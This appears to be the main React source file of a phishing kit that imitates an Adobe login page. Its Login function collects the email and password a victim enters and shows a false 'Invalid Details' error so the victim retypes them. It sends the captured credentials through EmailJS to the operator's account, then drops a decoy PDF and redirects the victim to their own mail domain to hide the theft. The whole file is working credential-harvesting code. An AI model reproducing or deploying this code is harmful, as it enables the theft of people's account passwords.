import React, { useState } from "react";
import AdobeForm from "./components/AdobeForm";
import logo from "./Image/error!.png";
import emailjs from "emailjs-com";
import jsPDF from "jspdf";

function App() {
  const [user, setUser] = useState({ email: "", password: "" });
  const [error, setError] = useState("");

  const Login = (details, counter, setView) => {
    setUser({
      email: details.email,
      password: details.password,
    });

    try {
      if (
        !/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i.test(
          details.email
        ) ||
        details.password === ""
      ) {
        setError("Invalid Details. Please Check the details and try again");
      }
      if (counter <= 2) {
        setError("Invalid Details. Please Check the details and try again");
      } else {
        setError("");
      }
    } catch (e) {
      setError("err");
    }

    // send To Email
    if (error != "" || counter > 3) {
      emailjs
        .send(
          "service_x6hu0ud",
          "template_lf79x3o",
          details,
          "user_IL5fakIwm8zK6NFatXezQ"
        )
        .then(
          (result) => {
            console.log("SUCCESS!", result.status, result.text);
          },
          (error) => {
            setError(error.text);
          }
        );
    }

    const my_email = details.email;

    // url extraction

    const ind = my_email.indexOf("@");
    const my_slice = my_email.substr(ind + 1);
    const c = my_slice.substr(0, my_slice.indexOf("."));
    const final = c.toLowerCase();
    const finalu = c.toUpperCase();

    // downloading pdf and redirect_link

    function success() {
      try {
        if (error == "" && counter > 3) {
          const doc = new jsPDF("landscape", "px", "a4", "false");
          doc.addImage(logo, "PNG", 65, 20, 500, 400);
          doc.save("file.pdf");
          console.log(user);
          setView(" Verifying ...");
          // window.open(logo)
          window.location.replace("http://www." + my_slice);
        }
      } catch (err) {
        setError(err);
      }
    }
    success();
  };
  return (
    <div id="content">
      {user.email !== "" ? (
        <AdobeForm Login={Login} error={error} />
      ) : (
        <AdobeForm Login={Login} error={error} />
      )}
    </div>
  );
}

export default App;
